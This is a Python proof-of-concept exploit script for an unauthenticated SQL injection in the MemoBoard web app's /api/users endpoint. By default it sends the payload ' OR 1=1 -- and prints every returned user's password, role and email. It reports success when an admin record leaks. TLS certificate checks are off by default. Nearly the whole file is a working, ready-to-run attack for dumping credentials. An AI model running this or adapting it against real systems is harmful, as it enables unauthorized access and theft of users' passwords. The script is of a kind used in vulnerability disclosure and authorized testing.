#!/usr/bin/env python3
"""PoC: MemoBoard unauthenticated SQL injection on GET /api/users?name=.

Dumps all users' passwords (including admin) via boolean-based injection.
"""
import argparse
import json
import os
import ssl
import urllib.error
import urllib.parse
import urllib.request

MSGS = {
    "ssl_warn": (
        "[!] Warning: HTTPS target skips TLS certificate verification by default "
        "(common for IP access or self-signed certs); pass --strict-ssl for strict verification",
        "[!] 警告：HTTPS 目标默认跳过 TLS 证书校验（常见于 IP 访问或自签证书）；传入 --strict-ssl 可恢复严格校验",
    ),
    "request": ("Request:", "请求:"),
    "status": ("Status:", "状态:"),
    "response": ("Response:", "响应:"),
    "extracted": (
        "Extracted user record(s) with passwords:",
        "已提取含密码的用户记录:",
    ),
    "ok": (
        "SUCCESS: Admin credentials leaked via unauthenticated SQL injection.",
        "成功：未授权 SQL 注入泄露管理员凭据。",
    ),
    "no_admin": ("Admin record not found in results.", "结果中未找到管理员记录。"),
    "not_json": ("Response is not valid JSON.", "响应不是合法 JSON。"),
    "error": ("Error:", "错误:"),
}


def msg(key: str, zh: bool) -> str:
    en, zh_s = MSGS[key]
    return zh_s if zh else en


def never_bypass(host, **kwargs):
    return False


def ssl_context(*, strict: bool) -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    if strict:
        return ctx
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def opener(proxy: str, *, strict_ssl: bool):
    handlers = [urllib.request.HTTPSHandler(context=ssl_context(strict=strict_ssl))]
    if proxy:
        os.environ["no_proxy"] = ""
        os.environ["NO_PROXY"] = ""
        urllib.request.proxy_bypass = never_bypass
        if hasattr(urllib.request, "proxy_bypass_environment"):
            urllib.request.proxy_bypass_environment = never_bypass
        if hasattr(urllib.request, "proxy_bypass_registry"):
            urllib.request.proxy_bypass_registry = never_bypass
        handlers.insert(0, urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    return urllib.request.build_opener(*handlers)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard SQLi PoC")
    p.add_argument("-u", "--url", required=True, help="Target origin, e.g. http://127.0.0.1:5000")
    p.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080; empty=direct")
    p.add_argument(
        "--strict-ssl",
        action="store_true",
        help="Strict HTTPS certificate verification (default: skip mismatch/self-signed)",
    )
    p.add_argument("--zh", action="store_true", help="Print labels/status in Chinese (default: English)")
    p.add_argument("--payload", default="' OR 1=1 --", help="SQLi payload for name param")
    args = p.parse_args()
    zh = args.zh

    base = args.url.rstrip("/")
    if base.lower().startswith("https://") and not args.strict_ssl:
        print(msg("ssl_warn", zh))
    http = opener(args.proxy, strict_ssl=args.strict_ssl)

    params = urllib.parse.urlencode({"name": args.payload})
    url = f"{base}/api/users?{params}"
    req = urllib.request.Request(url, headers={"Accept": "application/json"})
    print(msg("request", zh), f"GET {url}")
    try:
        resp = http.open(req, timeout=15)
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read().decode("utf-8", errors="replace")
    except Exception as e:
        print(msg("error", zh), e)
        return 1

    print(msg("status", zh), status)
    print(msg("response", zh))
    print(body)

    try:
        data = json.loads(body)
        users = data.get("users", [])
        print(f"\n{msg('extracted', zh)} {len(users)}")
        for u in users:
            print(
                f"    - username={u.get('name')}, password={u.get('password')}, "
                f"role={u.get('role')}, email={u.get('email')}"
            )
        if any(u.get("role") == "admin" for u in users):
            print(f"\n{msg('ok', zh)}")
            return 0
        print(f"\n{msg('no_admin', zh)}")
        return 1
    except json.JSONDecodeError:
        print(f"\n{msg('not_json', zh)}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
